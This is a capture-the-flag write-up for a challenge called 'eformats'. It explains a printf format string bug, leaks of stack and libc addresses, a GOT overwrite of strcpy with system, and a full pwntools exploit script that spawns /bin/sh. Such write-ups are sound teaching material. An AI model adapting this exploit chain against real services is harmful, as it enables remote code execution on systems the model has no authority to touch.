### Eformats

I started off by running the binary to see what it does, and enumerate its entry points. Turns out, it is a very simple program. It has two menus: login and the main menu. The login menu is very simple, just two options:

```
1. Login
9. Exit
> 
```

After entering '1\n' and then pressing enter again (it has another read, nothing important, just a small thing to keep in mind when writing the exploit scipt) the application presents its other menu:

```
Welcome back, 
1. Disconnect
2. Change username
3. Display info
9. Exit
>
```

There isn't really much to see there, 4 options, and only one of them allows for user input, which is option number 2, change username. After entering '2\' we can then enter a string <b> up to 24 bytes long </b>. After which the menu will print the same menu yet again, only that this time it will also print the username we entered, with the welcome message. The `printf` call that prints this username is not vulnerable, as we can see from the decompilation (I used Ghidra):

```c
printf("\nWelcome back, %s\n",param_1);
```

The interesting part is the display info function, which prints your username and password, but the `printf` call that it uses is vulnerable to a format string attack:

```c
void display_info(char *param_1)
{
  puts("Username: ");
  printf(param_1); // <= vulnerable call to printf
  puts("Password: *** ");
  return;
}
```

The rest of the program didn't seem vulnerable, and the name of the challenge is "eformats" so it's almost granted that you have to use that string format vulnerability to beat it. So I started thinking what I should do in order to exploit this vulnerability. Before anything else though, the most important thing to figure out is the controllable buffer offset from the `display_info` function's stack frame. After a simple trial and error, we can see that the offset is 16:

```
Welcome back, 
1. Disconnect
2. Change username
3. Display info
9. Exit
> 
2    
aaaaaaaa%16$lx

Welcome back, aaaaaaaa%16$lx

1. Disconnect
2. Change username
3. Display info
9. Exit
> 
3
Username: 
aaaaaaaa6161616161616161
Password: ***
```

Now, what can we do with that string format vulnerability? One thing that came to mind was to leak `system`'s address in libc and overwrite `main`'s return address with it and then its first stack argument with the address of our controllable buffer, where we'd put `/bin/sh\x00`. But I soon remembered this is x86-64 and the first argument is passed through `RDI` and not the stack, so that wouldn't have worked. Maybe rewriting the address so it first jumps to a gadget that I could use to control `RDI`? Looking at the output of ROPgadget, one soon realizes that there isn't much we could use for that purpose. Then, I noticed there were a couple of libc's functions that were called using our controllable buffer as the first argument:

<b> strcpy: </b>

```c
void login(char *param_1
{
// [...]
  param_1[0x80] = '\x01';
  strcpy(param_1,param_1);
// [...]
}
```

<b> strchr: </b>

```c
bool validate(char *param_1)
{
  char *pcVar1;
  
  pcVar1 = strchr(param_1,0x25);
  return pcVar1 != (char *)0x0;
}
```

<b> And the vulnerable printf itself: </b>

```c
void display_info(char *param_1)
{
  puts("Username: ");
  printf(param_1);
  puts("Password: *** ");
  return;
}

```

The thought that followed was: why not overwrite the GOT entry of one of those functions with that of system, and then get the process to call the overwritten function? That would end up calling `system(controllable_buffer)` and we'd simply put `/bin/sh\x00` in the controllable buffer, so we'd get a `system("/bin/sh")` it sounded good, so I went with it:

### Leaking an address in the binary:

Let's take a look at the stack right before we call the vulnerable printf:

<img width="915" height="470" alt="image" src="https://github.com/user-attachments/assets/c48d4767-5d9a-4bc1-a0ec-57ac3cc689b1" />

Highlighted in pink is the address of our controllable buffer and in blue the return address of `display_info`. They are in positions 2 and 4 respectively, from the top (or bottom) of the stack. In order to leak them, we need format strings `"%7$lx"` and `"%9$lx"`, 7 and 9 because the first five arguments (`"%1$lx` to `"%5$lx`) are not in the stack, but in the registers `RSI`, `RDX`, `RCX`, `R8` and `R9`(remember this is the SysV ABI).

### Leaking strcpy@libc and system@libc

After leaking the return address of `display_info`, which returns to `main_connected` I calculated its offset from `strcpy`'s GOT entry:

<img width="817" height="315" alt="image" src="https://github.com/user-attachments/assets/2a650da0-e64b-4b70-b3fc-8959b40753bd" />

We can now use the payload "AAA%17$s" + `strcpy@GOT` to leak the address of `strcpy` at libc, the real address. It looks like this in memory:

<img width="1672" height="684" alt="image" src="https://github.com/user-attachments/assets/eea118eb-8bcf-4d9b-9fd1-b42b814b53c4" />

Fun fact: notice that we have to put the format string first, something like `strcpy@GOT` + "%16$s" wouldn't work because of the zeroes in `strcpy@got`, as far as I know, most addresses in x86-64 systems have their two most significant bytes set to 0. I was stuck for a bit because of this.

Finally, we get `strcpy@libc`'s address, so we can compute `system@libc` by adding an offset that we can calculate easily:

<img width="810" height="312" alt="image" src="https://github.com/user-attachments/assets/cb39ff07-27c2-4e64-ac70-b403a16822e2" />

Except I lied a bit. Because in this version of libc `strcpy`'s address falls into a multiple of `0x100`, the first byte (LSB) will always be zero. So in reality, we need to skip over that one byte, and leak the rest, we multiply whatever we get by `0x100` to compensate for that one byte. The payload is thus "AAA%17$s" + (`strcpy@GOT` + 1).

### Overwriting the GOT

We can now overwrite `strcpy`'s GOT entry:

```python
SYSTEM_AT_LIBC = p64(u64(STRCPY_AT_LIBC) - OFFSET_TO_SYSTEM)

b0 = u64(SYSTEM_AT_LIBC) & 0xff
send_payload_with_input(byte_write(u64(STRCPY_AT_GOT), b0, 18))

b1 = (u64(SYSTEM_AT_LIBC) >> 8) & 0xff
send_payload_with_input(byte_write(u64(STRCPY_AT_GOT) + 1, b1, 18)) 

b2 = (u64(SYSTEM_AT_LIBC) >> 16) & 0xff
send_payload_with_input(byte_write(u64(STRCPY_AT_GOT) + 2, b2, 18))
```

Because they are both in the same binary, libc, they aren't that far off in memory, so it suffices to rewrite the last 3 bytes of `strcpy@libc` with the last 3 bytes of `system@libc`, as the rest of the address is the same.

### Getting to execute strcpy

Finally, we try to divert the flow of the application so it executes the `strcpy` that I showed you earlier. Because that call goes through the GOT, `system` will be invoked instead. There's a much, much, much easier way (so much that I facepalmed) of doing this than the way I did, but I'll show you how I did it regardless. When we first start the process, the `main_disconnected` function is called. This is the function that shows the simple "login, exit" menu. After "logging in", the rest of the time we will be executing `main_connected` and never execute `main_disconnected` again:

```c
void main(void)
{
  // [...] unimportant stuff
  local_18 = '\0';
  do {
    while (local_18 == '\0') { // <- main_disconnected will be executed only once, because main_disconnected sets local_18 to 1
      main_disconnected(local_98);
    }
    main_connected(local_98);
  } while( true );
}
```

That is a problem, because `main_disconnected` is the function that ends up calling `strcpy` (so our `system`). So I thought that I had to overwrite `local_18` as well. Turns out, `local_18` is at offset `0x80` from our controllable buffer. So after rewriting `strcpy`'s GOT entry, I had to send one last payload overwriting `local_18` with `\x00`. There was a problem though. The payload had to be "/bin/sh\x00" + `format_string_that_sets_local_18_to_zero` + `padding` + `address_of_local_18` and I had to fit that in 24 bytes, which is the max length of our payload. And I didn't find a way to do this. The solution I came up with was to write the address of `local_18` in the stack beforehand, so I could omit it from the payload, and use those 8 bytes for the format string. And that's what I did:

```python
for i in range (0, 8):
	b = (ADDR_OF_IMPORTANT_LOCAL >> 8 * i) & 0xff
	send_payload_with_input(byte_write(ADDR_OF_PL + i, b, 18))
	
prefix = bytes(b'/bin/sh\x00')
needed = (256 - len(prefix)) & 0xff
fmt = f"%{needed}c%20$hhn".encode()

send_payload_with_input(prefix + fmt)
```

`ADDR_OF_PL` is the address of our `controllable_buffer + 32` so `%20$` is its index. I tried first to write it at `%19$` but I wasn't able to. The last byte would always remain zero. I didn't debug it to find out why. So this is how the buffer looked like:

<img width="1573" height="208" alt="image" src="https://github.com/user-attachments/assets/35914f47-a7ad-4860-9689-a88da6853659" />

There was one final problem though. If `/bin/sh\x00` was the first thing in the payload, `printf` would stop there. At the first nullbyte. And the rest of the format string wouldn't be processed. So the rest of the payload wouldn't run. But at the same time, if the nullbyte isn't there, then `system` would receive `/bin/sh%248c%...` as parameter, total gibberish. The solution? Use a hashtag to comment out the rest of the string! So `/bin/sh #` instead.

<img width="1573" height="208" alt="image" src="https://github.com/user-attachments/assets/ec6279a9-fd5d-468f-a843-66002004d185" />

And that solves it! Sometimes it crashes with SIGSEGV, I don't really know what happens, I haven't debugged it yet to see what's going on. But in any case, here's the final script and solution:

```python
from pwn import *
import time

OFFSET_WRITABLE = 16 # how many quadwords from the first stack argument of the vulnerable printf until the buffer where the username is being stored, ill use this as the first argument for fmtstr_payload
OFFSET_STRCPY = 0x2bfb # offset from main_connected to strcpy's entry at the global offset table
OFFSET_TO_SYSTEM = 0x616f0 # offset from strcpy in libc to system in libc

# when we get to the printf function that has the vulnerability
# the stack looks like this: 8 bytes_of_garbage, address_of_string, rbp_of_display_info, ret_address_of_display_info
# ret_address_of_display_info is equal to main_connected+0x6c

BIN_NAME = "./main"

elf = context.binary = ELF(BIN_NAME)

def byte_write(target_addr, value_byte, arg_index):
    # arg_index is the %N$ index that corresponds to the Nth quadword where the target_addr will be, starting at 16
    v = value_byte & 0xff
    if v == 0:
        fmt = f"%{arg_index}$hhn".encode()        # write 0 if printed count is already 0
    else:
        fmt = f"%{v}c%{arg_index}$hhn".encode()   # print v chars, then write low byte

    pad = b"A" * ((8 - (len(fmt) % 8))) # align to 8 bytes
    payload = fmt + pad + p64(target_addr)

    print("payload:", repr(payload))  # debuggin this shit
    return payload

def send_payload_with_input(payload): # this is so I don't have to repeat sendline('2') sendline('3') after every single input...
    proc.sendline(b'2')
    proc.sendline(payload)
    time.sleep(0.05)
    proc.sendline(b'3')

def start():
    if args.GDB:
        return gdb.debug(BIN_NAME)
    if args.REMOTE:
        return remote('<REMOTE>',42069)
    else:
        return process(BIN_NAME)
        
proc = start()

proc.sendline(b'1') # log in
proc.sendline(b'') # skip a random read

time.sleep(0.05) # i dont really know why, but if i dont introduce this delay, the program sometimes bugs... wtf?

send_payload_with_input(b'%9$lx') # leak retaddr of display info into main_connected

proc.recvuntil(b"Username: \n")

RETADDR_OF_DISPLAY_INFO = proc.recvline().strip()
RETADDR_OF_DISPLAY_INFO = RETADDR_OF_DISPLAY_INFO.decode()
ADDR_OF_MAIN_CONNECTED = p64(int(RETADDR_OF_DISPLAY_INFO, 16) - 0x6c) # return address of display_info into main_connected (-0x6c so we get the address of main_connected)

STRCPY_AT_GOT = p64(u64(ADDR_OF_MAIN_CONNECTED) + OFFSET_STRCPY)

print("Address of main_connected: ", ADDR_OF_MAIN_CONNECTED[::-1].hex())

send_payload_with_input(b'%7$lx') # read the address of the buffer where our fmt string will be stored when we change the username

proc.recvuntil(b"Username: \n")

ADDR_OF_CONTROLLABLE_BUFFER = proc.recvline().strip()
ADDR_OF_CONTROLLABLE_BUFFER  = ADDR_OF_CONTROLLABLE_BUFFER.decode()
ADDR_OF_CONTROLLABLE_BUFFER = p64(int(ADDR_OF_CONTROLLABLE_BUFFER, 16)) # return address of display_info into

print("Address of buffer where our string is being stored: ", ADDR_OF_CONTROLLABLE_BUFFER[::-1].hex())

STRCPY_AT_GOT_PLUS_ONE = p64(u64(STRCPY_AT_GOT) + 1) # strcpy's address starts with zero (LSB), so I need to leak from strcpy@GOT + 1 to skip that 0
# and print the rest of the address

# send_payload_with_input(STRCPY_AT_GOT + b'%16$s') fun fact: i first tried this but it doesn't work because of the zeroes that STRCPY_AT_GOT contains, most virtual addresses have their most significant 16 bits set to zero (i was stuck for a bit because of this lol)

send_payload_with_input(b'AAA%17$s' + STRCPY_AT_GOT_PLUS_ONE) # leak the address of strcpy at libc, the 3 A's are for padding.

proc.recvuntil(b"Username: \n")

STRCPY_AT_LIBC = proc.recvline()
STRCPY_AT_LIBC = STRCPY_AT_LIBC[3:-21] # remove the "password: "... at the end and the 3 A's at the beginning.
STRCPY_AT_LIBC = u64(STRCPY_AT_LIBC[:8].ljust(8, b'\x00'))
STRCPY_AT_LIBC = p64(STRCPY_AT_LIBC * 0x100) # adding a byte to the right, compensating for the 0 we skip over when leaking the address
#STRCPY_AT_LIBC = p64(int(STRCPY_AT_LIBC, 16)) # return address of display_info into

print("Address of strcpy at libc", STRCPY_AT_LIBC[::-1].hex())

SYSTEM_AT_LIBC = p64(u64(STRCPY_AT_LIBC) - OFFSET_TO_SYSTEM) # write one by one the least significant 3 bytes of system() into strcpy's entry

print("Address of system at libc", SYSTEM_AT_LIBC[::-1].hex())

b0 = u64(SYSTEM_AT_LIBC) & 0xff
send_payload_with_input(byte_write(u64(STRCPY_AT_GOT), b0, 18))

b1 = (u64(SYSTEM_AT_LIBC) >> 8) & 0xff
send_payload_with_input(byte_write(u64(STRCPY_AT_GOT) + 1, b1, 18)) 

b2 = (u64(SYSTEM_AT_LIBC) >> 16) & 0xff
send_payload_with_input(byte_write(u64(STRCPY_AT_GOT) + 2, b2, 18))

ADDR_OF_IMPORTANT_LOCAL = u64(ADDR_OF_CONTROLLABLE_BUFFER) + 0x80 # this can be deduced from the disassembly
print("Address of important local: ", p64(ADDR_OF_IMPORTANT_LOCAL)[::-1].hex())
ADDR_OF_PL = u64(ADDR_OF_CONTROLLABLE_BUFFER) + 0x20 # +32 (20 index) for some reason, it wont let me write on +24

for i in range (0, 8): # write byte by byte the address of the local variable in main() that controls whether main_connected/main_disconnected gets called
	b = (ADDR_OF_IMPORTANT_LOCAL >> 8 * i) & 0xff
	send_payload_with_input(byte_write(ADDR_OF_PL + i, b, 18))
	
prefix = bytes(b'/bin/sh #')
needed = (256 - len(prefix)) & 0xff
fmt = f"%{needed}c%20$hhn".encode()
    
#gdb.attach(proc)

send_payload_with_input(prefix + fmt)

# finally, after going back into main_disconnected the login, exit prompt will be displayed again

proc.sendline(b'1') # log in
proc.sendline(b'') # skip a random read

proc.interactive() # and there we go...
```

There's a much, much simpler solution as I mentioned, skipping the last part where I overwrite `local_18`. Try to solve the exercise by yourself, and find out what it is! You'll facepalm as hard as I did... 🤦‍♂️
